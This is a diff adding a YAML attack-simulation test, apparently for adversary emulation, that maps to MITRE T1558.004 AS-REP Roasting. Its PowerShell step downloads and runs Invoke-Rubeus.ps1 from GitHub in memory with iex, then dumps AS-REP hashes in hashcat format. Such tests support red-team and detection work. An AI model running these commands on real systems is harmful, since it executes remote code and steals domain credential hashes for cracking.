@@ -1,0 +1,23 @@
+api_version: "2.0"
+name: WinPwn - PowerSharpPack - Kerberoasting Using Rubeus
+description: PowerSharpPack - Kerberoasting Using Rubeus technique via function of WinPwn
+uuid: 8c385f88-4d47-4c9a-814d-93d9deec8c71
+mitre:
+    tactics:
+        - 'TA0006: Credential Access'
+    techniques:
+        - 'T1558: Steal or Forge Kerberos Tickets'
+    subtechniques:
+        - 'T1558.004: AS-REP Roasting'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: winpwn---powersharppack---kerberoasting-using-rubeus
+      inline: |-
+        iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1')
+        Invoke-Rubeus -Command "asreproast /format:hashcat /nowrap"
+      executor: powershell
+      cleanup:
+        inline: ""
+        executor: powershell
